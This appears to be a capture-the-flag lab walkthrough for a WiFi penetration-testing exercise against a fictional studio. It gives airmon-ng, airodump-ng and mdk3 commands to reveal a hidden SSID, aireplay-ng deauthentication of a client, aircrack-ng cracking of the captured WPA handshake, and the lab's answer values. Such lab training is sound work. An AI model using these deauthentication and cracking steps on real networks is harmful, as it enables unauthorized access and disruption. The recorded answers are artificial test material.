The CISO of our client, `GamerZone Studios`, recently attended a cybersecurity conference where they participated in an intro to attacking WiFi devices. Given the company's reliance on wireless networks for game development, testing, and daily operations, the CISO is concerned about potential vulnerabilities and security misconfigurations in their WiFi infrastructure. He has requested our team to conduct a thorough penetration test on their WiFi networks, focusing on identifying and exploiting any weaknesses that could jeopardize their wireless security. Our task is to map out the available wireless networks, identify hidden SSIDs, and test for vulnerabilities in their encryption, configuration, and client interactions.

Your objective is to uncover any flaws that could be exploited to gain unauthorized access or disrupt the network, ensuring `GamerZone Studios` can address these issues promptly and maintain a secure wireless environment.

Harness the WiFi attack techniques you learned in this module to disclose all of the security vulnerabilities.

> [!Note]
 Please wait for 2 minutes after the target spawn to connect.


---

## Steps

### What is the name of the WiFi network with the BSSID D8:D6:3D:EB:29:D5?

Answer: *HTB*
1. Check the adapters.

```shell
ifconfig
```

![[scenario_check_adapters.png]]

The adapter to use is `wlan0`.

2. Put the adapter in *monitor* mode.

```shell
sudo airmon-ng start wlan0
```

![[wlan0mon.png]]

3. Dump the networks.

```shell
sudo airodump-ng wlan0mon
```

![[airodump-ng.png]]

3. Identify the hidden SSID.

```shell
sudo airodump-ng -c 1 wlan0mon
```

![[Hidden_SSID.png]]

You can see on the *Probes* column the network's SSID.

You can use this method too.

```shell
sudo mdk3 wlan0mon p -b u -c 1 -t D8:D6:3D:EB:29:D5

```
### What is the password for the WiFi network with the BSSID D8:D6:3D:EB:29:D5?

Answer: *minecraft*

1. View the available WiFi networks. Run the following on one terminal.

```shell
sudo airodump-ng -c 1 wlan0mon -w htb
```

Some *htp-01* files will be created on the directory you are working on.

2. Deauthentication. On another terminal run. (Don't close the first one)

```shell
sudo aireplay-ng -0 5 -a D8:D6:3D:EB:29:D5 -c 02:00:00:00:02:00 wlan0mon
```

![[aireplay-ng-1.png]]

3. Come back to the first terminal.

![[WPA_handshake.png]]


4. Crack WPA

```bash
aircrack-ng htb-01.cap -w /opt/wordlist.txt
```

![[crack_WPA.png]]

### Connect to the WiFi network and submit the flag found at IP 192.168.1.1 or 192.168.2.1

1. Create file called *wpa.conf*.
2. Add the following code and save it.

```bash
network={
        ssid="HTB"
        psk="minecraft"
        scan_ssid=1
        key_mgmt=WPA-PSK
}
```

3. Initiate your wpa connection to the AP using the following command.

```shell
sudo wpa_supplicant -c wpa.conf -i wlan0
```

